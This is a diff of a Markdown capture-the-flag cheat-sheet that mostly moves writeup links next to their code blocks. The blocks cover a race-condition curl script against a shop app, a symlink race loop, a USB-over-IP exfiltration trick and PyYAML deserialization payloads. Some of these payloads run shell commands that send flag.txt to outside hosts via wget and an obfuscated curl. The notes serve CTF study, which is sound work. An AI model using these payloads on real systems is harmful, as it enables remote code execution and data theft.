@@ -13,22 +13,22 @@
 
 # racing, race-condition
 
-```bash
-username=
-password=
-cookie1="PHPSESSID=3k21rt4acut215r1adlrq5m0p0"
-cookie2="PHPSESSID=ck8pgb52nkkb8sdg2c95ms7s16"
-url="http://202.120.7.197/app.php"
+- [Temmo's Tiny Shop - 0CTF 2017](https://www.40huo.cn/blog/0ctf-2017-writeup.html)
+    ```bash
+    username=
+    password=
+    cookie1="PHPSESSID=3k21rt4acut215r1adlrq5m0p0"
+    cookie2="PHPSESSID=ck8pgb52nkkb8sdg2c95ms7s16"
+    url="http://202.120.7.197/app.php"
 
-curl "$url?action=login" -b $cookie1 -d "username=$username&pwd=$password" &
-curl "$url?action=login" -b $cookie2 -d "username=$username&pwd=$password"
+    curl "$url?action=login" -b $cookie1 -d "username=$username&pwd=$password" &
+    curl "$url?action=login" -b $cookie2 -d "username=$username&pwd=$password"
 
-curl "$url?action=buy&id=1" -b $cookie1
+    curl "$url?action=buy&id=1" -b $cookie1
 
-curl "$url?action=sale&id=1" -b $cookie1 &
-curl "$url?action=sale&id=1" -b $cookie2
-```
-    - [Temmo's Tiny Shop - 0CTF 2017](https://www.40huo.cn/blog/0ctf-2017-writeup.html)
+    curl "$url?action=sale&id=1" -b $cookie1 &
+    curl "$url?action=sale&id=1" -b $cookie2
+    ```
 
 - https://github.com/saw-your-packet/ctfs/blob/master/DarkCTF/Write-ups.md#-chain-race
     - ~/share/ctf/darkctf2020/chain-race/
@@ -45,7 +45,8 @@ while true; do
     rm -f bigfile
 done
 ```
-    - https://github.com/kahla-sec/CTF-Writeups/blob/master/DarkCTF2020/McQueen.md
+
+- https://github.com/kahla-sec/CTF-Writeups/blob/master/DarkCTF2020/McQueen.md
 
 ### symlink
 
@@ -154,6 +155,7 @@ find / -perm -u=s -type f 2>/dev/null
     ?>
     ```
 - USB over IP
+    - [CTFtime\.org / CyberSecurityRumble CTF / EZExfil / Writeup](https://ctftime.org/writeup/24786)
     ```bash
     # On localhost:
     # Given "GatewayPorts yes" enabled in $vps_host sshd_config
@@ -174,7 +176,6 @@ find / -perm -u=s -type f 2>/dev/null
     # On $vps_host:
     cat flag.txt > /dev/ttyS0
     ```
-        - [CTFtime\.org / CyberSecurityRumble CTF / EZExfil / Writeup](https://ctftime.org/writeup/24786)
 
 # encodings
 
@@ -199,19 +200,19 @@ Morse
 # yaml
 
 - PyYAML yaml.load()
-    ```yaml
-    some_option: !!python/object/apply:os.system ["cat flag.txt"]`
-    # ||
-    some_option: !!python/object/apply:subprocess.call
-      args: [wget foo.com/"$(cat flag)"]
-      kwds: {shell: true}
-    ```
-        - https://imcmy.me/hitcon-ctf-2016-writeup-archive/
-    ```yaml
-    !!python/object/new:type
-      args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
-      listitems: "\x5f\x5fimport\x5f\x5f('os')\x2esystem('curl -POST mil1\x2eml/jm9 -F x=@flag\x2etxt')"
-    ```
-        - https://hackmd.io/@harrier/uiuctf20
+    - https://imcmy.me/hitcon-ctf-2016-writeup-archive/
+        ```yaml
+        some_option: !!python/object/apply:os.system ["cat flag.txt"]`
+        # ||
+        some_option: !!python/object/apply:subprocess.call
+          args: [wget foo.com/"$(cat flag)"]
+          kwds: {shell: true}
+        ```
+    - https://hackmd.io/@harrier/uiuctf20
         - https://github.com/yaml/pyyaml/pull/386
         - https://gist.github.com/adamczi/23a3b6d4bb7b2be35e79b0667d6682e1
+        ```yaml
+        !!python/object/new:type
+          args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
+          listitems: "\x5f\x5fimport\x5f\x5f('os')\x2esystem('curl -POST mil1\x2eml/jm9 -F x=@flag\x2etxt')"
+        ```
